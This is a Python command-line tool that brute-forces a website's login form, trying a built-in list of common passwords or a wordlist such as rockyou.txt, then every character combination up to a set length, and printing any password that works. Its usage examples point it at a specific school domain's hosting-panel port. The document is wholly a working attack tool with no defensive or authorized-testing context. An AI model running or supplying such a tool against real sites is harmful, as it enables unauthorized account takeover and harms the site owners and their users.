import requests
import string
import itertools
import sys
import os

BASE_URL = None
USERNAME = None
WORDLIST_PATH = None

session = requests.Session()

COMMON_PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789",
    "12345", "1234", "111111", "1234567", "sunshine",
    "qwerty123", "iloveyou", "princess", "admin", "welcome",
    "666666", "abc123", "football", "123123", "monkey",
    "654321", "!@#$%^&*", "changeme", "test", "guest",
    "letmein", "passw0rd", "admin123", "Pa$$w0rd", "p@ssw0rd",
    "root", "toor", "0", "1", "pass", "admin1", "administrator",
    "demo", "default", "temp", "temporary", "secret",
    "qwertyuiop", "asdfghjkl", "zxcvbnm",
    "1234567890", "000000", "121212", "123321",
    "pass123", "pass1234", "admin1234",
    "P@ssw0rd!", "P@$$w0rd", "Password1", "Password123",
]

CHARSET = string.ascii_lowercase + string.digits
MIN_LEN = 1
MAX_LEN = 6
total_attempts = 0

def try_login(password):
    global total_attempts
    total_attempts += 1
    try:
        resp = session.post(
            f"{BASE_URL}/login/",
            data={"user": USERNAME, "pass": password, "login": ""},
            allow_redirects=True,
            timeout=10,
        )
        success = "login_form" not in resp.text and "Log in" not in resp.text[:2000]
        if success:
            return True
        if resp.status_code == 302 and resp.headers.get("Location", "").rstrip("/") != "/login":
            return True
        return False
    except requests.RequestException:
        return False

def load_wordlist(path):
    if not os.path.isfile(path):
        return None
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

def main():
    global BASE_URL, USERNAME, WORDLIST_PATH, CHARSET, MIN_LEN, MAX_LEN

    if len(sys.argv) < 3:
        print(f"Usage: python {sys.argv[0]} <url> <username> [options]")
        print(f"Options:")
        print(f"  -w <wordlist>    Use wordlist file instead of common passwords")
        print(f"  -c <chars>       Custom charset for brute force (default: a-z + 0-9)")
        print(f"  --min <n>        Min password length for brute force (default: {MIN_LEN})")
        print(f"  --max <n>        Max password length for brute force (default: {MAX_LEN})")
        print(f"  --full-charset   Use all printable characters (a-z, A-Z, 0-9, symbols)")
        print(f"\nExamples:")
        print(f"  python {sys.argv[0]} https://cfschools.net.ng:2083/ cfschools.net.ng")
        print(f"  python {sys.argv[0]} https://cfschools.net.ng:2083/ cfschools.net.ng -w rockyou.txt")
        print(f"  python {sys.argv[0]} https://cfschools.net.ng:2083/  cfschools.net.ng --min 3 --max 4")
        print(f"  python {sys.argv[0]} https://cfschools.net.ng:2083/ cfschools.net.ng --full-charset --min 1 --max 3")
        sys.exit(1)

    BASE_URL = sys.argv[1].rstrip("/")
    USERNAME = sys.argv[2]

    i = 3
    while i < len(sys.argv):
        arg = sys.argv[i]
        if arg == "-w" and i + 1 < len(sys.argv):
            WORDLIST_PATH = sys.argv[i + 1]
            i += 2
        elif arg == "-c" and i + 1 < len(sys.argv):
            CHARSET = sys.argv[i + 1]
            i += 2
        elif arg == "--min" and i + 1 < len(sys.argv):
            MIN_LEN = int(sys.argv[i + 1])
            i += 2
        elif arg == "--max" and i + 1 < len(sys.argv):
            MAX_LEN = int(sys.argv[i + 1])
            i += 2
        elif arg == "--full-charset":
            CHARSET = string.ascii_letters + string.digits + string.punctuation
            i += 1
        else:
            print(f"[!] Unknown option: {arg}")
            sys.exit(1)

    print(f"[*] Target: {BASE_URL}/login/")
    print(f"[*] Username: {USERNAME}")

    if WORDLIST_PATH:
        wordlist = load_wordlist(WORDLIST_PATH)
        if wordlist is None:
            print(f"[!] Wordlist not found: {WORDLIST_PATH}")
            sys.exit(1)
        print(f"[*] Loaded {len(wordlist)} passwords from {WORDLIST_PATH}")
        print("[*] Testing wordlist...")
        for pwd in wordlist:
            sys.stdout.write(f"\r[~] Trying ({total_attempts}): {pwd[:40]}")
            sys.stdout.flush()
            if try_login(pwd):
                print(f"\n\n[+] SUCCESS! Password: {pwd}")
                print(f"[+] Total attempts: {total_attempts}")
                return
        print()
    else:
        print(f"[*] Testing {len(COMMON_PASSWORDS)} common passwords...")
        for pwd in COMMON_PASSWORDS:
            sys.stdout.write(f"\r[~] Trying ({total_attempts}): {pwd}")
            sys.stdout.flush()
            if try_login(pwd):
                print(f"\n\n[+] SUCCESS! Password: {pwd}")
                print(f"[+] Total attempts: {total_attempts}")
                return
        print()

    print(f"[*] Starting brute force (length {MIN_LEN}-{MAX_LEN}, charset size: {len(CHARSET)})...")
    for length in range(MIN_LEN, MAX_LEN + 1):
        print(f"[*] Trying length {length}...")
        for combo in itertools.product(CHARSET, repeat=length):
            pwd = "".join(combo)
            sys.stdout.write(f"\r[~] Trying ({total_attempts}): {pwd}")
            sys.stdout.flush()
            if try_login(pwd):
                print(f"\n\n[+] SUCCESS! Password: {pwd}")
                print(f"[+] Total attempts: {total_attempts}")
                return

    print(f"\n[-] No password found after {total_attempts} attempts.")

if __name__ == "__main__":
    main()
